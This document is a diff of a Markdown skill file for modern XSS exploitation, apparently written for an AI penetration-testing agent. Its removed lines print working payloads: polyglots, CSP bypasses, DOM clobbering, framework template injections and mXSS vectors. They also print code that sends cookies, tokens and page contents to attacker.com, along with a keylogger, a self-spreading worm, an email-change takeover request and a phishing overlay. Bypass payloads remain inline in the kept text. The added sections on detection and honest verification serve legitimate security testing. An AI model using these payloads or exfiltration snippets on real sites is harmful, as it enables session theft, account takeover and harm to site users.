@@ -1,4 +1,4 @@
----
+﻿---
 name: modern-xss
 description: "Modern XSS exploitation with polyglot payloads, CSP bypass, DOM clobbering, and framework-specific techniques"
 category: specialized
@@ -55,46 +55,22 @@ Payloads designed to fire across multiple injection contexts simultaneously.
 
 ### Universal Polyglots
 
-```
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
-```
 Fires in href, event handler, and JS string contexts.
 
-```
-";/*</title></style></textarea></noscript></xmp><svg/onload=alert(1)>//
-```
 Closes HTML tag contexts, breaks out of title/style/textarea/noscript, injects SVG.
 
-```
-'">><marquee onstart=alert(1)>
-```
 Generic context-breaker for attribute injection.
 
-```
-"><img src=x onerror=alert(1)>
-```
 Breaks out of any attribute-quoted context.
 
-```
-'-'-alert(1)-'-'
-```
 Inside JS numeric or string arithmetic contexts.
 
 ### Advanced Polyglots
 
-```
-javascript:/*`/*'/*"/*/(/*oNcLiCk*=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
-```
 Multi-context payload using URL encoding and parser differential.
 
-```
-</script><svg onload=alert(1)>
-```
 If injected inside a `<script>` block — breaks script context, triggers via SVG.
 
-```
-{{constructor.constructor('alert(1)')()}}
-```
 Template injection polyglot for Angular, Vue, Svelte template contexts.
 
 ---
@@ -105,12 +81,6 @@ Template injection polyglot for Angular, Vue, Svelte template contexts.
 
 Injection directly into `<body>` content.
 
-```
-<svg onload=alert(1)>
-<img src=x onerror=alert(1)>
-<details open ontoggle=alert(1)>
-<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
-```
 
 **Filter Bypass:**
 - Case variation: `<sVg oNlOaD=alert(1)>`
@@ -122,13 +92,6 @@ Injection directly into `<body>` content.
 
 Injection inside an HTML attribute value.
 
-```
-" onfocus=alert(1) autofocus="
-" onmouseover=alert(1) "
-' onfocus=alert(1) autofocus='
-" style="background:url(javascript:alert(1))
-" onclick=alert(1) "
-```
 
 **Filter Bypass:**
 - Tab/newline between event handler and `=`: `" onfocus	=alert(1)`
@@ -139,12 +102,6 @@ Injection inside an HTML attribute value.
 
 Injection inside a JS string literal.
 
-```
-';alert(1);//
-"-alert(1)-"
-`-alert(1)-`
-</script><script>alert(1)</script>
-```
 
 **Filter Bypass:**
 - Unicode escapes: `\u0027;alert(1);`
@@ -156,14 +113,6 @@ Injection inside a JS string literal.
 
 Injection inside `href`, `src`, or `action` attributes.
 
-```
-javascript:alert(1)
-javascript:alert%281%29
-javascript:void`alert(1)`
-javascript:/*-/*`/*\`/*'/*"/**/(/* */alert(1))//
-data:text/html,<script>alert(1)</script>
-data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
-```
 
 **Filter Bypass:**
 - Tab/newline after `javascript:`: `javascript%0a:alert(1)`
@@ -175,12 +124,6 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 
 Injection inside ES6 template literals.
 
-```
-${alert(1)}
-`-alert(1)-`
-${document.cookie}
-${fetch('//evil.com/?c='+document.cookie)}
-```
 
 ---
 
@@ -193,31 +136,16 @@ If `script-src` includes `unsafe-inline`, standard inline scripts execute. No by
 ### unsafe-eval Present
 
 If `unsafe-eval` is present:
-```
-eval(atob('YWxlcnQoMSk='))
-new Function('alert(1)')()
-setTimeout('alert(1)')
-setInterval('alert(1)',1000)
-```
 
 ### Base URI Injection
 
 If `base-uri` is not restricted:
-```html
-<base href="https://attacker.com/">
-```
 All relative script `src` paths now resolve to attacker-controlled URLs. Combine with a script file on the attacker domain.
 
 ### JSONP Endpoint Abuse
 
 Many CDN-hosted libraries expose JSONP callbacks:
-```
-https://cdn.example.com/libraries/jquery/3.6.0/jquery.min.js?callback=alert
-```
 If the domain is allowlisted in CSP, load the JSONP endpoint as a script:
-```html
-<script src="https://cdn.example.com/libraries/jquery/3.6.0/jquery.min.js?callback=alert"></script>
-```
 
 ### CDN Script Injection
 
@@ -232,9 +160,6 @@ If an attacker can publish a package or control a repo, they can inject code int
 ### path: Directive Bypass
 
 If CSP uses `path:` in `script-src`:
-```
-script-src 'self' https://cdn.example.com/app/
-```
 Bypass by injecting a script at a path under the allowed directory:
 - If upload endpoint stores files under `/app/uploads/`, upload a `.js` file there
 - If the app has a route that reflects content as `text/javascript`, use that route
@@ -242,15 +167,6 @@ Bypass by injecting a script at a path under the allowed directory:
 ### strict-dynamic Abuse
 
 If `script-src` includes `strict-dynamic`:
-```
-<script src="https://trusted.com/lib.js"></script>
-<script>
-  // Any script created by a trusted script is also trusted
-  var s = document.createElement('script');
-  s.src = 'https://attacker.com/evil.js';
-  document.body.appendChild(s);
-</script>
-```
 Find a DOM XSS or mutation that creates script elements via a trusted script.
 
 ### nonce Reuse
@@ -272,52 +188,23 @@ Overwrite DOM properties to influence JavaScript execution.
 
 ### Basic Clobbering
 
-```html
-<a id=owner><a id=owner name=owner>
-```
 If JS does `document.owner`, it returns the `<a>` element instead of `document`.
 
 ### Prototype Pollution Chain
 
-```html
-<a id=prototype><a id=prototype name=prototype>
-```
 Combined with code that reads `config[someKey]`, clobbered elements become truthy values.
 
 ### document.domain Override
 
-```html
-<form id=document><input name=domain value=evil.com></form>
-```
 If JS reads `document.domain`, it gets the attacker-controlled value.
 
 ### Constructor Clobbering
 
-```html
-<img id=x onerror="Object.defineProperty(window,'config',{value:{src:'https://evil.com/payload.js'}})">
-```
 Or via named elements:
-```html
-<iframe name=constructor src="javascript:alert(1)">
-```
 
 ### URL Parser Clobbering
 
-```html
-<a id=url href="//evil.com">
-```
 If JS reads `element.href` or parses `document.getElementById('url').href`, it resolves to the attacker's domain.
-
-### Practical Clobbering Chain
-
-```html
-<div id=el></div>
-<a id=el name=innerHTML>
-<script>
-  // el.innerHTML is now the <a> element, not the property
-  // If code does el.innerHTML = userInput, the clobbered property may interfere
-</script>
-```
 
 ---
 
@@ -326,17 +213,11 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 ### React
 
 **dangerouslySetInnerHTML:**
-```jsx
-<div dangerouslySetInnerHTML={{__html: userInput}} />
-```
 - Direct HTML injection if user input is not sanitized
 - Payload: `<img src=x onerror=alert(document.cookie)>`
 - Bypass React's JSX escaping — JSX escapes `{userInput}` but not `dangerouslySetInnerHTML`
 
 **React URL handlers:**
-```jsx
-<a href={userProvidedUrl}>Link</a>
-```
 - React allows `javascript:` URLs in `href`
 - Payload: `javascript:alert(1)`
 - React 16.x+ warns but does not block in all cases
@@ -348,11 +229,6 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 ### Angular
 
 **Template injection:**
-```
-{{7*7}}  → 49
-{{constructor.constructor('alert(1)')()}}
-{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('alert(1)');}}
-```
 
 **Angular bypasses:**
 - `bypassSecurityTrustHtml()` — disables sanitizer for specific values
@@ -361,48 +237,26 @@ If JS reads `element.href` or parses `document.getElementById('url').href`, it r
 - `routerLink` with attacker-controlled navigation targets
 
 **Angular-specific payloads:**
-```
-{{toString().constructor.prototype.charAt=[].join;$eval('alert(1)');}}
-{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
-```
 
 ### Vue
 
 **v-html directive:**
-```html
-<div v-html="userInput"></div>
-```
 - Direct HTML injection, equivalent to `innerHTML`
 - Payload: `<img src=x onerror=alert(1)>`
 
 **Vue template injection:**
-```
-{{7*7}}
-{{constructor.constructor('alert(1)')()}}
-{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
-```
 
 **Vue event handler injection:**
-```
-v-on:click=alert(1)
-@click=alert(1)
-```
 If user input is placed in Vue template directives.
 
 ### Svelte
 
 **{#html} / {@html} tag:**
-```svelte
-{@html userInput}
-```
 - Direct HTML injection
 - No built-in sanitization
 - Payload: `<img src=x onerror=alert(1)>`
 
 **Svelte reactive statements:**
-```
-$:{alert(1)}
-```
 If user input reaches reactive declarations.
 
 ---
@@ -413,39 +267,22 @@ Exploits parser differentials between browser sanitizers and actual rendering.
 
 ### noscript Escaping
 
-```html
-<noscript><img src=x onerror=alert(1)></noscript>
-```
 When `noscript` content is parsed by a sanitizer that treats it as raw text, but the browser renders it when JS is enabled.
 
 ### textarea/title Injection
 
-```html
-<textarea><img src=x onerror=alert(1)></textarea>
-<title><img src=x onerror=alert(1)></title>
-```
 Sanitizers may not parse inside raw text elements, but browser mutation can break out.
 
 ### DOMParser mXSS
 
-```js
-var doc = new DOMParser().parseFromString('<div><img src=x onerror=alert(1)>', 'text/html');
-document.body.appendChild(doc.body.firstChild);
-```
 DOMParser may interpret content differently than the live DOM, enabling bypasses.
 
 ### Template Element mXSS
 
-```html
-<template><img src=x onerror=alert(1)></template>
-```
 Content inside `<template>` is not rendered until the element is cloned and appended to the DOM.
 
 ### SVG ForeignObject
 
-```html
-<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
-```
 SVG namespace parsing differs from HTML, bypassing some sanitizers.
 
 ---
@@ -454,70 +291,21 @@ SVG namespace parsing differs from HTML, bypassing some sanitizers.
 
 ### OOB Data Theft
 
-```js
-// Basic cookie exfiltration
-fetch('https://attacker.com/steal?c='+document.cookie)
-
-// Via image pixel
-new Image().src='https://attacker.com/steal?c='+document.cookie
-
-// Via script injection
-var s=document.createElement('script');
-s.src='https://attacker.com/steal.js?d='+btoa(document.cookie);
-document.body.appendChild(s);
-
-// Via WebSocket
-var ws=new WebSocket('wss://attacker.com/exfil');
-ws.onopen=function(){ws.send(document.cookie)};
-```
 
 ### CSS Exfiltration
 
-```css
-input[value^="a"] { background-image: url(https://attacker.com/a); }
-input[value^="b"] { background-image: url(https://attacker.com/b); }
-```
 Brute-force character-by-character extraction of input values.
 
 **Modern CSS exfiltration:**
-```css
-@import url('https://attacker.com/leak?data=' attr(data-secret));
-```
 
 ### WebSocket Exfiltration
 
-```js
-var ws=new WebSocket('wss://attacker.com/exfil');
-ws.onopen=function(){
-  ws.send(JSON.stringify({
-    cookies:document.cookie,
-    tokens:localStorage.getItem('token'),
-    html:document.documentElement.outerHTML
-  }));
-};
-```
 
 ### Fetch API Exfiltration
 
-```js
-fetch('https://attacker.com/exfil',{
-  method:'POST',
-  body:JSON.stringify({
-    cookies:document.cookie,
-    url:location.href,
-    dom:document.body.innerHTML.substring(0,5000)
-  }),
-  headers:{'Content-Type':'application/json'}
-});
-```
 
 ### DNS Exfiltration
 
-```js
-// Encode data in DNS queries
-var data=btoa(document.cookie);
-new Image().src='https://'+data+'.attacker.com/track';
-```
 Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.
 
 ---
@@ -526,53 +314,20 @@ Data appears in DNS server logs. Useful when HTTP exfiltration is blocked.
 
 ### Session Hijacking
 
-```js
-fetch('https://attacker.com/steal?session='+document.cookie)
-// or
-new Image().src='https://attacker.com/steal?session='+localStorage.getItem('sessionId')
-```
 Stolen session token allows attacker to impersonate the victim.
 
 ### Account Takeover
 
-```js
-// Change victim's email
-fetch('/api/account/email',{
-  method:'POST',
-  body:JSON.stringify({email:'attacker@evil.com'}),
-  headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken}
-});
-```
 Combine session theft with account modification for permanent takeover.
 
 ### Phishing Overlay
 
-```js
-var iframe=document.createElement('iframe');
-iframe.src=location.href;
-iframe.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;opacity:0.01';
-document.body.appendChild(iframe);
-// Captures keystrokes from the invisible iframe
-```
 
 ### Worm Payload
 
-```js
-// Self-propagating XSS worm
-// Stored in a field that other users view
-var worm='<script>fetch("/api/post",{method:"POST",body:JSON.stringify({content:document.body.innerHTML.substring(0,2000)}),headers:{"Content-Type":"application/json"}})</script>';
-// Every user who views the infected post triggers the payload
-// Which posts the content to their own profile
-// Which infects their followers, and so on
-```
 
 ### Keylogger
 
-```js
-document.onkeypress=function(e){
-  fetch('https://attacker.com/log?key='+e.key+'&page='+location.href);
-};
-```
 
 ---
 
@@ -585,3 +340,24 @@ document.onkeypress=function(e){
 - Do NOT assume a sanitizer is bypassable — test with actual payloads and verify via render
 - Record every evidence artifact: HTTP responses, rendered DOM snapshots, dialog confirmations
 - If a payload does not fire, report the specific failure mode (blocked by CSP, output-encoded, not reflected, etc.)
+
+## Trigger Conditions
+
+Activate when user input is reflected or flows into an HTML/JS/attribute/URL sink, or a DOM sink (`innerHTML`, `eval`, `document.write`, `location.*`, jQuery selectors) consumes untrusted data. Trigger on CSP-bearing pages (when bypasses may exist), framework pipelines (React/Angular/Vue/Svelte) with dangerous bindings, stored vectors (comments/profiles/messages), and parser-differential (mXSS) contexts. Do not trigger when output is consistently context-encoded and verified, CSP is strict nonce-enforced with no bypass, or no input reaches any sink.
+
+## Detection Approach
+
+First determine the injection context from the reflection point: HTML body, attribute, JS string, template literal, URL `href`/`src`, or DOM sink. Pick a context-appropriate probe (e.g., `{{7*7}}`-style math won't apply; use a script/event-handler shape) and confirm execution via `evaluateRendered`/`getDialogEvidence` — reflection alone is not XSS. If a filter blocks, switch context or encoding (case, null byte, unicode, double-encode, protocol whitespace) and use polyglots that span multiple contexts. When CSP is present, inspect it first (`script-src` directives) and only attempt bypasses that are actually available (`unsafe-inline`, JSONP on allowlisted CDN, `strict-dynamic` with a trusted DOM-XSS, nonce reuse, `path:` upload). For DOM XSS, trace the client-side data flow to the sink rather than relying on server reflection. For stored XSS, verify the payload persists and fires for other viewers.
+
+## Pitfalls
+
+- Claiming XSS from reflection alone — the payload must actually execute in the rendered DOM (`evaluateRendered`/`getDialogEvidence`).
+- Assuming a CSP is bypassable without reading the actual `Content-Security-Policy` header and available directives.
+- Assuming framework escaping is bypassed — JSX escapes `{input}`; only `dangerouslySetInnerHTML`/v-html/bypassSecurityTrust* are sinks.
+- Guessing DOM clobbering works without confirming the app reads the clobbered property.
+- Treating a WAF block as success — report the blocked attempt honestly.
+- Overlooking that `HttpOnly` cookies limit token theft even when XSS fires.
+
+## Verification & Impact
+
+CONFIRMED when a payload demonstrably executes in the rendered DOM (dialog/alert evidence, or script side-effect observed via `getDialogEvidence`/`evaluateRendered`), or stored XSS fires for another viewer. SUSPECTED when reflection occurs but execution isn't proven — record as candidate. Document impact by capability and context: session/cookie theft and account takeover (highest when authenticated), phishing overlay, worm, keylogger, or mere visual defacement. Note CSP status and whether a bypass was required. Capture the request, rendered DOM snapshot, and dialog evidence via `recordEvidence`.
